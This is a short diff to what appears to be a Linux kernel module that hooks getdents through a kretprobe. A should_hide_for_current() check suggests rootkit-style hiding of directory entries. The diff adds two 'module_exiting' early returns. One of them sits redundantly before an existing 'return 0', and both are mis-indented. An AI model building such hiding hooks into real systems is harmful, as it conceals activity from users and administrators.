@@ -405,6 +405,8 @@ static int getdents_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 	d->dirent = NULL;
 	d->kbuf = NULL;
 	d->kbuf_len = 0;
+		if (module_exiting)
+			return 0;
 	d->scoped = should_hide_for_current();
 
 	if (!d->scoped)
@@ -498,6 +500,8 @@ out:
 	kfree(d->kbuf);
 	d->kbuf = NULL;
 	d->kbuf_len = 0;
+		if (module_exiting)
+			return 0;
 	return 0;
 }
 
